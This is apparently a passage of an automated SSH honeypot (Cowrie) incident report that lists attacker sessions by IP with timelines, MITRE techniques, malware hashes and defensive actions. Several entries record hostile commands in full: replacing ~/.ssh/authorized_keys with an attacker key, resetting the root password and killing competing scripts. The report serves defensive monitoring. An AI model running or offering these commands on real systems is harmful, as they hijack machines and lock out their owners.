| `2026-04-17 06:56:44` | `cowrie.session.connect` |
| `2026-04-17 06:56:44` | `cowrie.client.version` |
| `2026-04-17 06:56:44` | `cowrie.client.kex` |
| `2026-04-17 06:56:44` | `cowrie.login.success` |
| `2026-04-17 06:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76678299477

| Field | Detail |
|---|---|
| **Source IP** | `125.77.133[.]94` |
| **First Seen** | 2026-04-17 06:56 |
| **Last Seen** | 2026-04-17 06:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:56:48` | `cowrie.session.connect` |
| `2026-04-17 06:56:48` | `cowrie.client.version` |
| `2026-04-17 06:56:48` | `cowrie.client.kex` |
| `2026-04-17 06:56:49` | `cowrie.login.success` |
| `2026-04-17 06:56:50` | `cowrie.session.params` |
| `2026-04-17 06:56:50` | `cowrie.command.input` |
| `2026-04-17 06:56:50` | `cowrie.command.failed` |
| `2026-04-17 06:56:50` | `cowrie.log.closed` |
| `2026-04-17 06:56:50` | `cowrie.session.params` |
| `2026-04-17 06:56:50` | `cowrie.command.input` |
| `2026-04-17 06:56:50` | `cowrie.session.file_download` |
| `2026-04-17 06:56:50` | `cowrie.log.closed` |
| `2026-04-17 06:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.77.133[.]94` to AbuseIPDB if not already reported
- [ ] Block `125.77.133[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d9f2847cfe

| Field | Detail |
|---|---|
| **Source IP** | `125.77.133[.]94` |
| **First Seen** | 2026-04-17 06:56 |
| **Last Seen** | 2026-04-17 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:56:56` | `cowrie.session.connect` |
| `2026-04-17 06:56:56` | `cowrie.client.version` |
| `2026-04-17 06:56:57` | `cowrie.client.kex` |
| `2026-04-17 06:56:57` | `cowrie.login.success` |
| `2026-04-17 06:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.77.133[.]94` to AbuseIPDB if not already reported
- [ ] Block `125.77.133[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e9953d5c7e3

| Field | Detail |
|---|---|
| **Source IP** | `59.50.24[.]47` |
| **First Seen** | 2026-04-17 06:57 |
| **Last Seen** | 2026-04-17 06:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:57:11` | `cowrie.session.connect` |
| `2026-04-17 06:57:11` | `cowrie.client.version` |
| `2026-04-17 06:57:11` | `cowrie.client.kex` |
| `2026-04-17 06:57:12` | `cowrie.login.success` |
| `2026-04-17 06:57:12` | `cowrie.session.params` |
| `2026-04-17 06:57:12` | `cowrie.command.input` |
| `2026-04-17 06:57:12` | `cowrie.command.failed` |
| `2026-04-17 06:57:12` | `cowrie.log.closed` |
| `2026-04-17 06:57:13` | `cowrie.session.params` |
| `2026-04-17 06:57:13` | `cowrie.command.input` |
| `2026-04-17 06:57:13` | `cowrie.session.file_download` |
| `2026-04-17 06:57:13` | `cowrie.log.closed` |
| `2026-04-17 06:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.50.24[.]47` to AbuseIPDB if not already reported
- [ ] Block `59.50.24[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f47e5cbee807

| Field | Detail |
|---|---|
| **Source IP** | `59.50.24[.]47` |
| **First Seen** | 2026-04-17 06:57 |
| **Last Seen** | 2026-04-17 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:57:20` | `cowrie.session.connect` |
| `2026-04-17 06:57:20` | `cowrie.client.version` |
| `2026-04-17 06:57:20` | `cowrie.client.kex` |
| `2026-04-17 06:57:21` | `cowrie.login.success` |
| `2026-04-17 06:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.50.24[.]47` to AbuseIPDB if not already reported
- [ ] Block `59.50.24[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5fb76fef51a

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 06:57 |
| **Last Seen** | 2026-04-17 06:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:57:35` | `cowrie.session.connect` |
| `2026-04-17 06:57:35` | `cowrie.client.version` |
| `2026-04-17 06:57:35` | `cowrie.client.kex` |
| `2026-04-17 06:57:36` | `cowrie.login.success` |
| `2026-04-17 06:57:37` | `cowrie.session.params` |
| `2026-04-17 06:57:37` | `cowrie.command.input` |
| `2026-04-17 06:57:37` | `cowrie.command.failed` |
| `2026-04-17 06:57:37` | `cowrie.log.closed` |
| `2026-04-17 06:57:38` | `cowrie.session.params` |
| `2026-04-17 06:57:38` | `cowrie.command.input` |
| `2026-04-17 06:57:38` | `cowrie.session.file_download` |
| `2026-04-17 06:57:38` | `cowrie.log.closed` |
| `2026-04-17 06:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c8b4bb24064

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 06:57 |
| **Last Seen** | 2026-04-17 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:57:42` | `cowrie.session.connect` |
| `2026-04-17 06:57:42` | `cowrie.client.version` |
| `2026-04-17 06:57:42` | `cowrie.client.kex` |
| `2026-04-17 06:57:43` | `cowrie.login.success` |
| `2026-04-17 06:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2dcecbce88c

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 06:57 |
| **Last Seen** | 2026-04-17 06:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:57:58` | `cowrie.session.connect` |
| `2026-04-17 06:57:58` | `cowrie.client.version` |
| `2026-04-17 06:57:58` | `cowrie.client.kex` |
| `2026-04-17 06:57:59` | `cowrie.login.success` |
| `2026-04-17 06:58:00` | `cowrie.session.params` |
| `2026-04-17 06:58:00` | `cowrie.command.input` |
| `2026-04-17 06:58:00` | `cowrie.command.failed` |
| `2026-04-17 06:58:00` | `cowrie.log.closed` |
| `2026-04-17 06:58:00` | `cowrie.session.params` |
| `2026-04-17 06:58:00` | `cowrie.command.input` |
| `2026-04-17 06:58:00` | `cowrie.session.file_download` |
| `2026-04-17 06:58:00` | `cowrie.log.closed` |
| `2026-04-17 06:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e4a4f3d7df

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 06:58 |
| **Last Seen** | 2026-04-17 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:58:03` | `cowrie.session.connect` |
| `2026-04-17 06:58:03` | `cowrie.client.version` |
| `2026-04-17 06:58:03` | `cowrie.client.kex` |
| `2026-04-17 06:58:04` | `cowrie.login.success` |
| `2026-04-17 06:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32fa4545ecc

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 06:59 |
| **Last Seen** | 2026-04-17 06:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:59:51` | `cowrie.session.connect` |
| `2026-04-17 06:59:51` | `cowrie.client.version` |
| `2026-04-17 06:59:51` | `cowrie.client.kex` |
| `2026-04-17 06:59:52` | `cowrie.login.success` |
| `2026-04-17 06:59:53` | `cowrie.session.params` |
| `2026-04-17 06:59:53` | `cowrie.command.input` |
| `2026-04-17 06:59:53` | `cowrie.command.failed` |
| `2026-04-17 06:59:53` | `cowrie.log.closed` |
| `2026-04-17 06:59:53` | `cowrie.session.params` |
| `2026-04-17 06:59:53` | `cowrie.command.input` |
| `2026-04-17 06:59:53` | `cowrie.session.file_download` |
| `2026-04-17 06:59:53` | `cowrie.log.closed` |
| `2026-04-17 06:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bde2311a7ff

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 06:59 |
| **Last Seen** | 2026-04-17 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 06:59:56` | `cowrie.session.connect` |
| `2026-04-17 06:59:56` | `cowrie.client.version` |
| `2026-04-17 06:59:56` | `cowrie.client.kex` |
| `2026-04-17 06:59:57` | `cowrie.login.success` |
| `2026-04-17 06:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3a5838ce121

| Field | Detail |
|---|---|
| **Source IP** | `59.50.24[.]47` |
| **First Seen** | 2026-04-17 07:00 |
| **Last Seen** | 2026-04-17 07:00 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0Fea1hsQ4uQC"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:00:22` | `cowrie.session.connect` |
| `2026-04-17 07:00:22` | `cowrie.client.version` |
| `2026-04-17 07:00:22` | `cowrie.client.kex` |
| `2026-04-17 07:00:23` | `cowrie.login.success` |
| `2026-04-17 07:00:23` | `cowrie.session.params` |
| `2026-04-17 07:00:23` | `cowrie.command.input` |
| `2026-04-17 07:00:23` | `cowrie.command.failed` |
| `2026-04-17 07:00:24` | `cowrie.log.closed` |
| `2026-04-17 07:00:24` | `cowrie.session.params` |
| `2026-04-17 07:00:24` | `cowrie.command.input` |
| `2026-04-17 07:00:24` | `cowrie.session.file_download` |
| `2026-04-17 07:00:24` | `cowrie.log.closed` |
| `2026-04-17 07:00:33` | `cowrie.session.params` |
| `2026-04-17 07:00:33` | `cowrie.command.input` |
| `2026-04-17 07:00:33` | `cowrie.log.closed` |
| `2026-04-17 07:00:34` | `cowrie.session.params` |
| `2026-04-17 07:00:34` | `cowrie.command.input` |
| `2026-04-17 07:00:34` | `cowrie.log.closed` |
| `2026-04-17 07:00:34` | `cowrie.session.params` |
| `2026-04-17 07:00:34` | `cowrie.command.input` |
| `2026-04-17 07:00:34` | `cowrie.session.file_download` |
| `2026-04-17 07:00:34` | `cowrie.log.closed` |
| `2026-04-17 07:00:35` | `cowrie.session.params` |
| `2026-04-17 07:00:35` | `cowrie.command.input` |
| `2026-04-17 07:00:35` | `cowrie.log.closed` |
| `2026-04-17 07:00:35` | `cowrie.session.params` |
| `2026-04-17 07:00:35` | `cowrie.command.input` |
| `2026-04-17 07:00:36` | `cowrie.log.closed` |
| `2026-04-17 07:00:36` | `cowrie.session.params` |
| `2026-04-17 07:00:36` | `cowrie.command.input` |
| `2026-04-17 07:00:36` | `cowrie.command.input` |
| `2026-04-17 07:00:36` | `cowrie.log.closed` |
| `2026-04-17 07:00:37` | `cowrie.session.params` |
| `2026-04-17 07:00:37` | `cowrie.command.input` |
| `2026-04-17 07:00:37` | `cowrie.log.closed` |
| `2026-04-17 07:00:37` | `cowrie.session.params` |
| `2026-04-17 07:00:37` | `cowrie.command.input` |
| `2026-04-17 07:00:37` | `cowrie.log.closed` |
| `2026-04-17 07:00:38` | `cowrie.session.params` |
| `2026-04-17 07:00:38` | `cowrie.command.input` |
| `2026-04-17 07:00:38` | `cowrie.log.closed` |
| `2026-04-17 07:00:38` | `cowrie.session.params` |
| `2026-04-17 07:00:38` | `cowrie.command.input` |
| `2026-04-17 07:00:38` | `cowrie.log.closed` |
| `2026-04-17 07:00:39` | `cowrie.session.params` |
| `2026-04-17 07:00:39` | `cowrie.command.input` |
| `2026-04-17 07:00:39` | `cowrie.log.closed` |
| `2026-04-17 07:00:39` | `cowrie.session.params` |
| `2026-04-17 07:00:39` | `cowrie.command.input` |
| `2026-04-17 07:00:40` | `cowrie.log.closed` |
| `2026-04-17 07:00:40` | `cowrie.session.params` |
| `2026-04-17 07:00:40` | `cowrie.command.input` |
| `2026-04-17 07:00:40` | `cowrie.log.closed` |
| `2026-04-17 07:00:40` | `cowrie.session.params` |
| `2026-04-17 07:00:40` | `cowrie.command.input` |
| `2026-04-17 07:00:41` | `cowrie.log.closed` |
| `2026-04-17 07:00:41` | `cowrie.session.params` |
| `2026-04-17 07:00:41` | `cowrie.command.input` |
| `2026-04-17 07:00:41` | `cowrie.log.closed` |
| `2026-04-17 07:00:42` | `cowrie.session.params` |
| `2026-04-17 07:00:42` | `cowrie.command.input` |
| `2026-04-17 07:00:42` | `cowrie.log.closed` |
| `2026-04-17 07:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.50.24[.]47` to AbuseIPDB if not already reported
- [ ] Block `59.50.24[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d399cfe9a7d

| Field | Detail |
|---|---|
| **Source IP** | `59.50.24[.]47` |
| **First Seen** | 2026-04-17 07:01 |
| **Last Seen** | 2026-04-17 07:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:01:17` | `cowrie.session.connect` |
| `2026-04-17 07:01:17` | `cowrie.client.version` |
| `2026-04-17 07:01:17` | `cowrie.client.kex` |
| `2026-04-17 07:01:18` | `cowrie.login.success` |
| `2026-04-17 07:01:18` | `cowrie.session.params` |
| `2026-04-17 07:01:18` | `cowrie.command.input` |
| `2026-04-17 07:01:18` | `cowrie.command.failed` |
| `2026-04-17 07:01:18` | `cowrie.log.closed` |
| `2026-04-17 07:01:18` | `cowrie.session.params` |
| `2026-04-17 07:01:18` | `cowrie.command.input` |
| `2026-04-17 07:01:19` | `cowrie.session.file_download` |
| `2026-04-17 07:01:19` | `cowrie.log.closed` |
| `2026-04-17 07:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.50.24[.]47` to AbuseIPDB if not already reported
- [ ] Block `59.50.24[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16ae0460247b

| Field | Detail |
|---|---|
| **Source IP** | `59.50.24[.]47` |
| **First Seen** | 2026-04-17 07:01 |
| **Last Seen** | 2026-04-17 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:01:26` | `cowrie.session.connect` |
| `2026-04-17 07:01:26` | `cowrie.client.version` |
| `2026-04-17 07:01:26` | `cowrie.client.kex` |
| `2026-04-17 07:01:26` | `cowrie.login.success` |
| `2026-04-17 07:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.50.24[.]47` to AbuseIPDB if not already reported
- [ ] Block `59.50.24[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a345fe09ae0

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:03 |
| **Last Seen** | 2026-04-17 07:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:03:20` | `cowrie.session.connect` |
| `2026-04-17 07:03:20` | `cowrie.client.version` |
| `2026-04-17 07:03:21` | `cowrie.client.kex` |
| `2026-04-17 07:03:21` | `cowrie.login.success` |
| `2026-04-17 07:03:22` | `cowrie.session.params` |
| `2026-04-17 07:03:22` | `cowrie.command.input` |
| `2026-04-17 07:03:22` | `cowrie.command.failed` |
| `2026-04-17 07:03:22` | `cowrie.log.closed` |
| `2026-04-17 07:03:23` | `cowrie.session.params` |
| `2026-04-17 07:03:23` | `cowrie.command.input` |
| `2026-04-17 07:03:23` | `cowrie.session.file_download` |
